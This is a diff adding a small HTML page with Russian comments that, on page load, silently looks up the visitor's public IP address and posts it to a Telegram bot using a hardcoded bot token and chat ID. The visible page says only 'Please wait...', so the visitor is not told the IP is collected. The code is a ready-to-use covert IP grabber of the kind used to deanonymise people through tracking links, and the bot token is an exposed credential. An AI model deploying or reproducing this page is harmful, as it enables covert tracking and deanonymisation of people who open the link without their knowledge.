@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get IP</title>
+    <script>
+        // Функция для получения IP-адреса через внешний API
+        async function getIP() {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            const userIP = data.ip;
+
+            // Отправляем IP-адрес в Telegram
+            const botToken = '7614177502:AAGyfPAcrC-ZDFUGDNGMZwqvmyke6dBjs1c'; // Замените на ваш токен бота
+            const chatId = '1110126206';    // Замените на ваш ID чата
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: `User IP: ${userIP}`
+                })
+            });
+        }
+
+        // Вызываем функцию при загрузке страницы
+        window.onload = getIP;
+    </script>
+</head>
+<body>
+    <h1>Пожалуйста, подождите...</h1>
+</body>
+</html>
